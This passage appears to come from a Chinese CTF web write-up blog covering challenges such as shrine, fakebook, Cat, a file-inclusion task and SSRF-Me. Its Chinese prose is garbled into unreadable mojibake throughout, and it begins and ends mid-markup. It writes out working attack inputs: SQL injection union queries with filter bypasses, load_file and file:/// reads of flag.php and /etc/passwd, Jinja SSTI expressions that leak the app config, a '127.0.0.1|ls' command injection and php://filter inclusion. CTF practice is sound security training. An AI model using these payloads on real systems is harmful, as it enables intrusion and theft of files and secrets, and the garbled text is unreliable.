single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em><em>$file ÊòØÁßÅÊúâÊàêÂëòÂ∫èÂàóÂåñ‰πãÂêéÂ≠óÁ¨¶‰∏≤È¶ñÂ∞æ‰ºöÂ§öÂá∫‰∏§‰∏™Á©∫Ê†º ‚Äú%00</em>%00‚ÄùÔºåÊâÄ‰ª•base64Âä†ÂØÜÊúÄÂ•ΩÂú®‰ª£Á†Å‰∏≠ÊâßË°åÈò≤Ê≠¢Â§çÂà∂ÊºèÊéâ</em>*<br>ËøêË°å‰πãÂêéÂæóÂà∞<br><img src="https://img-blog.csdnimg.cn/4f6b3bfcae2a4126ae4efcdb8ec73965.png" alt="2"><br>get‰º†ÂèÇÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/6a5689494cef49759c2f6d74d441bd2f.png" alt="3"><br>Ëøô‰∏™È¢òÂæàÊúâÂ≠¶‰π†‰ª∑ÂÄºÔºÅÔºÅÔºÅ</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><img src="https://img-blog.csdnimg.cn/183c9b29277e4ee497d4f342aad251b0.png" alt="4"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$miwen</span><span class="token operator">=</span><span class="token string double-quoted-string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">encode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_o</span><span class="token operator">=</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// echo $_o;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$_0</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$_0</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_0</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token variable">$_c</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_o</span><span class="token punctuation">,</span><span class="token variable">$_0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$__</span><span class="token operator">=</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$_c</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$_c</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$_c</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>     <span class="token keyword">return</span> <span class="token function">str_rot13</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*   ÈÄÜÂêëÂä†ÂØÜÁÆóÊ≥ïÔºåËß£ÂØÜ$miwenÂ∞±ÊòØflag*/</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Á¨¨‰∏ÄÊ¨°ÈÅáÂà∞ÔºåËÆ∞ÂΩï‰∏Ä‰∏ã„ÄÇ<br>Êàë‰ª¨Âè™ÈúÄË¶ÅÈÄÜÂêëËß£ÂØÜÂç≥ÂèØ„ÄÇ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string double-quoted-string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">str_rot13</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_o</span><span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$_0</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$_0</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_0</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token variable">$_c</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">,</span><span class="token variable">$_0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$__</span><span class="token operator">=</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$_c</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$_c</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_o</span><span class="token operator">.</span><span class="token variable">$_c</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span> <span class="token keyword">echo</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂæóÂà∞flag„ÄÇ</p><h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><p><img src="https://img-blog.csdnimg.cn/523623501a0d4d65b734a05f6fae1ba2.png" alt="2"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> flask<span class="token keyword">import</span> osapp <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span><span class="token operator">//</span>Ê≥®ÂÜå‰∫Ü‰∏Ä‰∏™FLAGÁöÑconfigÔºåÂ¶ÇÊûúÊ≤°ÊúâËøáÊª§ÁöÑËØùÂ∞±Áõ¥Êé•<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/shrine/&lt;path:shrine>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">shrine</span><span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> s    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>sstiÊ®°ÊùøÊ≥®ÂÖ•ÔºåÊòØpythonFlaskÊ°ÜÊû∂„ÄÇÁúãÂà∞<br><code>@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)</code>ËÆøÈóÆË∑ØÂæÑ<code>http://61.147.171.105:64429/shrine/%7B%7B8*8%7D%7D</code>Â≠òÂú®sstiÊ®°ÊùøÊ≥®ÂÖ•ÊºèÊ¥û„ÄÇ<br><code>safe_jinja</code>ÂáΩÊï∞ÂØπ**(Ôºå)ÔºåconfigÔºåself**ËøõË°åËøáÊª§„ÄÇ<br><img src="https://img-blog.csdnimg.cn/45c0d3fbef914c998da7b8cc9faac0f5.png" alt="1">Êü•Áúã‰∏Ä‰∏ãapp‰∏ãÁöÑconfig„ÄÇ</p><p>ÊñáÁ´†‰∏≠‰∫ÜËß£Âà∞Ôºö<br><strong>get_flashed_messagesÂáΩÊï∞</strong>Ôºö<code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</code><br><strong>url_forÂáΩÊï∞</strong>Ôºö<code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/4609f4f593f249f3b6aabc5fa7cc213c.png" alt="2"><br>ÂæóÂà∞flag„ÄÇ</p><h2 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h2><p>ÈùûÂ∏∏ÂÖ∑ÊúâÂ≠¶‰π†‰ª∑ÂÄº</p><p><img src="https://img-blog.csdnimg.cn/b9a7ec91e3214f8bb606a267bb14632b.png" alt="1"><br>Ê≥®ÂÜå‰∏Ä‰∏™Ë¥¶Âè∑ÁôªÈôÜ„ÄÇ<br><img src="https://img-blog.csdnimg.cn/f02e85228c7740f685c0fc3952ff3d11.png" alt="2"><br><code>?no=1 and 1=1</code>Ê≠£Â∏∏ÂõûÊòæÔºå<code>?no=1 and 1=2</code>Êä•Èîô„ÄÇÂ≠òÂú®SQLÊ≥®ÂÖ•„ÄÇ<br><code>?no=1 order by 5</code>Êä•Èîô<br><img src="https://img-blog.csdnimg.cn/2b8f182925864af49d2e3b146c651a8c.png" alt="3"><br>ÂºÄÂßãÁàÜÁ†¥„ÄÇ<br>ÂèëÁé∞Âä†ËΩΩ<code>?no=1 union select 1,2,3,4</code>Âá∫Áé∞<br><img src="https://img-blog.csdnimg.cn/1d4d6d53e1444e8c80cc361073c38eda.png" alt="1"><br>ËÇØÂÆöÊúâ‰∏úË•øË¢´ËøáÊª§‰∫Ü„ÄÇÊµãËØïÂèëÁé∞ËæìÂÖ•<code>-1/**/union/**/select/**/1,2,3,4</code>Ê≠£Â∏∏„ÄÇ<code>++ÂèØ‰ª•‰ª£Êõø/**/</code><br><img src="https://img-blog.csdnimg.cn/d6f1a1faeadb4b2ba8d126ca9b202e75.png" alt="4"><br>Â≠òÂú®ÂèçÂ∫èÂàóÂåñÔºåÂèëÁé∞2Â§ÑÂèØ‰ª•ÂõûÊòæ„ÄÇÁªßÁª≠ÊµãËØï<br><code>?no=-1/**/union/**/select/**/1,table_name,3,4 from INFORMATION_SCHEMA.TABLES -- -</code><br><code>?no=-1/**/union/**/select/**/1,group_concat(column_name),3,4 from INFORMATION_SCHEMA.columns where table_name=&quot;users&quot; -- -</code><br><img src="https://img-blog.csdnimg.cn/757a55887b714a0d9f8e953453f4c150.png" alt="2"><br>Â≠òÂú®ÂèçÂ∫èÂàóÂåñ„ÄÇ</p><blockquote><p>O:8:‚ÄùUserInfo‚Äù:3:{s:4:‚Äùname‚Äù;s:3:‚Äùrgg‚Äù;s:3:‚Äùage‚Äù;i:48;s:4:‚Äùblog‚Äù;s:7:‚Äù123.com‚Äù;}</p></blockquote><p>ÂêéÈù¢ÁúüÊòØ‰∏ç‰ºö‰∫Ü„ÄÇ‰∫ÜËß£‰∏Ä‰∏ãÂ∏àÂÇÖ‰ª¨ÁöÑÊñáÁ´†„ÄÇ<br><strong>Ê≥ï‰∏Ä</strong><br>ÈááÁî®ÊûÑÈÄ†fileÂçèËÆÆÂéªËØªÂèñ&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpÁöÑÂÜÖÂÆπÔºàfileÂçèËÆÆ‰∏ªË¶ÅÁî®‰∫éËÆøÈóÆËÆ°ÁÆóÊú∫Êú¨Âú∞Êñá‰ª∂ÔºåÂü∫Êú¨Ê†ºÂºè‰∏∫Ôºöfile:&#x2F;&#x2F;&#x2F;Êñá‰ª∂Ë∑ØÂæÑ</p><blockquote><p>-1 &#x2F;<strong>&#x2F;union &#x2F;</strong>&#x2F; select 1,2 ,3,‚ÄôO:8:‚ÄùUserInfo‚Äù:3:{s:4:‚Äùname‚Äù;s:1:‚Äù1‚Äù;s:3:‚Äùage‚Äù;i:18;s:4:‚Äùblog‚Äù;s:29:‚Äùfile:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php‚Äù;}‚Äô#</p></blockquote><p><img src="https://img-blog.csdnimg.cn/b4cdabced702488fad045fa3a4349ad6.png" alt="2"></p><p><strong>Ê≥ï‰∫å</strong><br> Âú®MySQL‰∏≠ÔºåLOAD_FILE()ÂáΩÊï∞ËØªÂèñ‰∏Ä‰∏™Êñá‰ª∂Âπ∂Â∞ÜÂÖ∂ÂÜÖÂÆπ‰Ωú‰∏∫Â≠óÁ¨¶‰∏≤ËøîÂõû„ÄÇ</p><blockquote><p>-1 &#x2F;<strong>&#x2F;union &#x2F;</strong>&#x2F; select 1,load_file(‚Äò&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php‚Äô) ,3,4#</p></blockquote><p><img src="https://img-blog.csdnimg.cn/1dbe5ddda5414ef98dbf713cc9269ad9.png" alt="3"></p><h2 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h2><p><img src="https://img-blog.csdnimg.cn/ed1db60906fd457e9bfd3bc7dbf9f8e8.png" alt="1"><br>‰∏ÄÈÅìÈùûÂ∏∏Êó†ÂéòÂ§¥ÁöÑÈ¢ò<br>‰∏ÄÊâìÂºÄÈù∂Âú∫‰ª•‰∏∫ÂéüÊù•ÂÅöËøáÁ±ª‰ººÁöÑÈ¢ò„ÄÇÂ∞±Áõ¥Êé•<strong>127.0.0.1|ls</strong>ÔºåÁúãÊù•ÊòØÂ§ßÊÑè‰∫Ü„ÄÇ<br><img src="https://img-blog.csdnimg.cn/98ece7b60e704191a326c30e875fef28.png" alt="2"><br>ÁàÜÁ†¥‰∏Ä‰∏ãÁúãÁúãËøáÊª§‰∫Ü‰ªÄ‰πà<br><img src="https://img-blog.csdnimg.cn/ee2d13cafd3e41e0b42b1104dde8b11c.png" alt="2"></p><p><img src="https://img-blog.csdnimg.cn/051cc20d945a4c9c8eba5da238368110.png" alt="3">453ÁöÑÊ≤°ÊúâËøáÊª§„ÄÇ<br><img src="https://img-blog.csdnimg.cn/0b317f3b22524f75a9c568a3801c5d6d.png" alt="5"></p><p>ÂØπ@ËøõË°åurlÁºñÁ†Å%40ÔºåËøòÊòØÊ≤°Áî®„ÄÇ<br>ËØïËØïÂÆΩÂ≠óÁ¨¶%EF<br>ÂæóÂà∞ÂÜÖÂÆπ„ÄÇ‰øùÂ≠ò‰∏∫htmlÊñá‰ª∂„ÄÇ<br><img src="https://img-blog.csdnimg.cn/6e906ca935e44e08985578b99ca60031.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/6ef3195b6ae148e09b3132416f430317.png" alt="5"><br>Êü•ËµÑÊñôÂêéÂéüÊù•ÊòØdjangoÊä•ÈîôÔºå‰ªîÁªÜÁúãÊñáÊ°£ÂèëÁé∞ÁªùÂØπË∑ØÂæÑÔºåÊâæ‰∏Ä‰∏ãÂèëÁé∞Êï∞ÊçÆÂ∫ìÁªùÂØπË∑ØÂæÑ</p><blockquote><p>&#x2F;opt&#x2F;api&#x2F;database.sqlite3 phpÁöÑcurl+@ÁªùÂØπË∑ØÂæÑÊñá‰ª∂Âêç</p></blockquote><p><img src="https://img-blog.csdnimg.cn/2c33bda622c940e0bc0f67609368b994.png" alt="5"><br>ÂÆΩÂ≠óËäÇ+&#x2F;opt&#x2F;api&#x2F;database.sqlite3Êä•ÈîôÂá∫ÂÜÖÂÆπÔºåÊü•ÊâæÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/546cdd2af98047b481d0122cc007eb32.png" alt="5"></p><h2 id="Ê≥∞Â±±ÊùØ-ÁÆÄÂçïÁöÑÊñá‰ª∂ÂåÖÂê´"><a href="#Ê≥∞Â±±ÊùØ-ÁÆÄÂçïÁöÑÊñá‰ª∂ÂåÖÂê´" class="headerlink" title="Ê≥∞Â±±ÊùØ-ÁÆÄÂçïÁöÑÊñá‰ª∂ÂåÖÂê´"></a>Ê≥∞Â±±ÊùØ-ÁÆÄÂçïÁöÑÊñá‰ª∂ÂåÖÂê´</h2><p><img src="https://img-blog.csdnimg.cn/b1427ceb81ee46f5bff6a37e6500cc57.png" alt="1"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$filename</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>È¢òÁõÆ‰∏≠ÂåÖÂê´‰∫Ücheck.phpÊñá‰ª∂ÔºåÂèØËÉΩÊòØËøáÊª§‰∫Ü‰∏Ä‰∫õÂáΩÊï∞ÔºåÊ≥®ÊÑè‰∏Ä‰∏ã„ÄÇÊï¥‰ΩìÁúãËµ∑Êù•ÂæàÁÆÄÂçïÔºåËØªÂéª‰∏Ä‰∏™Êñá‰ª∂ÁúãÁúã<br>payload:<strong><a href="http://61.147.171.105:49222/?filename=check.php">http://61.147.171.105:49222/?filename=check.php</a></strong><br><img src="https://img-blog.csdnimg.cn/2fa8d03887be43f8ac061799752d2b73.png" alt="2">Ê≠£Á°ÆÁöÑÁî®Ê≥ïÔºåÈîôËØØÁöÑÊñπÊ≥ïÔºüÈááÁî®‰º™ÂçèËÆÆËØïËØïÊñá‰ª∂ÂåÖÂê´ÔºåÁªèËøáÂá†Ê¨°ÊµãËØïÂèëÁé∞Âè™Êúâ‰ΩøÁî®php:&#x2F;&#x2F;filterËØªÂèñÊñá‰ª∂Êó∂Êâç‰ºöÊòæÁ§∫<strong>do not hackÔºÅ</strong>ÔºåÂÖ∂‰ªñÁöÑÂõûÊòæÂùá‰∏∫‰∏äÂõæ„ÄÇÈÇ£‰πàÂ∞±‰ªéphp:&#x2F;&#x2F;filter‰∏ãÊâã„ÄÇÈÄöËøáÊµãËØï‰∫ÜÂá†‰∏™ËøáÊª§Âô®ÂèëÁé∞ÔºåËÉΩÁî®ÁöÑËøáÊª§Âô®Âè™ÊúâËøô‰∏™‚Äî‚Äî**convert.iconv.***„ÄÇÊé®Ëçê‰∏ÄÁØáÊñáÁ´†<a href="https://blog.csdn.net/qq_44657899/article/details/109300335">php:&#x2F;&#x2F;filterÁöÑÂêÑÁßçËøáÊª§Âô®</a></p><blockquote><p>convert.iconv.<em>ÁöÑÁºñÁ†ÅÊñπÂºèÊúâ‰ª•‰∏ãÂá†ÁßçÔºö<br>UCS-4</em><br>UCS-4BE<br>UCS-4LE*<br>UCS-2<br>UCS-2BE<br>UCS-2LE<br>UTF-32*<br>UTF-32BE*<br>UTF-32LE*<br>UTF-16*<br>UTF-16BE*<br>UTF-16LE*<br>UTF-7<br>UTF7-IMAP<br>UTF-8*<br>ASCII*<br>‰ΩøÁî®ÊñπÊ≥ïÔºöconvert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</p></blockquote><p>Èöè‰æøÈÄâ‰∏§‰∏™ËØïËØïÔºö<br><img src="https://img-blog.csdnimg.cn/e139f5936a634f27851a021afc968e3f.png" alt="1">‰ΩøÁî®burpÂø´‰∏ÄÁÇπ<br><img src="https://img-blog.csdnimg.cn/8a26b67d40c54abf9b4f646cc65fb213.png" alt="2"><img src="https://img-blog.csdnimg.cn/7f4499930bc548d78033057c9a92cf05.png" alt="3">ÊãøÂà∞flag„ÄÇ</p><h2 id="‰ø°ÈÄöÈô¢-SSRF-Me"><a href="#‰ø°ÈÄöÈô¢-SSRF-Me" class="headerlink" title="‰ø°ÈÄöÈô¢ SSRF-Me"></a>‰ø°ÈÄöÈô¢ SSRF-Me</h2><p>ÁúãÊù•ËÄÉÁÇπÊòØssrf„ÄÇ<br><img src="https://img-blog.csdnimg.cn/6e134931c77f4b4a8b51c32ed069735d.png" alt="1"><br>Êü•ÁúãÊ∫êÁ†Å‰∏Ä‰∏ã<br><img src="https://img-blog.csdnimg.cn/0691770356f3440db6bfa7c51ab9e2b6.png" alt="2"><br>Áî±Ê≠§ÂèØ‰ª•ËØ¥ÊòéËØ∑Ê±ÇÂú∞ÂùÄ‰∏∫1270.0.1<br><code>Captcha: substr(md5(captcha), -6, 6) == &quot;b15ed1&quot;</code><br>ÊÑèÊÄùÊòØÂèñMD5Âä†ÂØÜÂêéÁöÑÂ≠óÁ¨¶‰ªéÂêéÂÖ≠‰ΩçÂºÄÂßãÊï∞ÂÖ≠‰Ωç‰∏îÂ≠óÁ¨¶ÊòØb15ed1ÔºåÈÇ£‰πàÂà∞ËøôÈáåÂ∞±Ë¶ÅÂºÄÂßãÁàÜÁ†¥ÂéüÂßãÊï∞ÊçÆ‰∫Ü</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$captcha</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$captcha</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"b15ed1"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$captcha</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token variable">$captcha</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>//ËæìÂá∫ÁªìÊûúÔºö23129<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂΩìËæìÂÖ•Ê°ÜÂÜÖËæìÂÖ•<strong>127.0.0.1:80</strong>Êó∂Ôºå‰ºöËøîÂõû‰∏§‰∏™ËæìÂÖ•Ê°ÜÔºåÈÇ£‰πàÂà©Áî®ssrfÁöÑÊºèÊ¥ûÔºå‰ΩøÁî®‰º™ÂçèËÆÆ<br>ËæìÂÖ•<strong>file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</strong>Êó∂ÊàêÂäüËøîÂõû<br><img src="https://img-blog.csdnimg.cn/c582bb91a3e7459a897e3524327530fa.png" alt="3">ËØªÂèñflag <strong>file:&#x2F;&#x2F;&#x2F;flag</strong>ÔºåflagÂÖ≥ÈîÆÂ≠óÁ¨¶ËøáÊª§‰∫Ü„ÄÇurlÁºñÁ†ÅÁªïËøáÔºåÊµèËßàÂô®‰∏äÂØπflagÁºñÁ†Å‰∏ÄÊ¨°Ôºå‰ΩÜÊòØburp‰∏äÈúÄË¶ÅÂØπflagÁºñÁ†Å‰∏§Ê¨°Âì¶„ÄÇ</p><blockquote><p>file:&#x2F;&#x2F;&#x2F;%66%6c%61%67<br>file:&#x2F;&#x2F;&#x2F;%2566%256c%2561%2567</p></blockquote><h2 id="bugÔºàRCTF2021Ôºâ"><a href="#bugÔºàRCTF2021Ôºâ" class="headerlink" title="bugÔºàRCTF2021Ôºâ"></a>bugÔºàRCTF2021Ôºâ</h2><p>ÂÖ®Á®ãBURPÊåÇ‰ª£ÁêÜÔºåËÉΩÂ§ü‰ªéÊØè‰∏Ä‰∏™ÂåÖ‰∏≠Ëé∑ÂæóÊúâÊïà‰ø°ÊÅØÔºåËøòÊòØË¶Å‰ªîÁªÜËßÇÂØüÔºÅÔºÅÔºÅ<br>ÊâìÂºÄÂ∞±ÊòØÁôªÂΩïÊ°ÜÔºö<br><img src="https://img-blog.csdnimg.cn/3efee6e2436046548b1c91b628940271.png" alt="1"><br>Â∞ùËØïadminÁôªÂΩïÔºåÂº±ÂØÜÁ†ÅÊó†Êûú„ÄÇÂÖàÊ≥®ÂÜå‰∏Ä‰∏™Ë¥¶Âè∑ÔºåÊ≥®ÂÜåadminÊòæÁ§∫Áî®Êà∑ÂêçÂ∑≤Â≠òÂú®ÔºåÊç¢test„ÄÇ<br>ÁôªÈôÜÊàêÂäüÂêéÂ∞ùËØïÊØè‰∏Ä‰∏™ÂäüËÉΩÁÇπÔºö<br>‰ΩøÁî®manageÊó∂<br><img src="https://img-blog.csdnimg.cn/bc84396bd69046409299c59b0d5b7305.png" 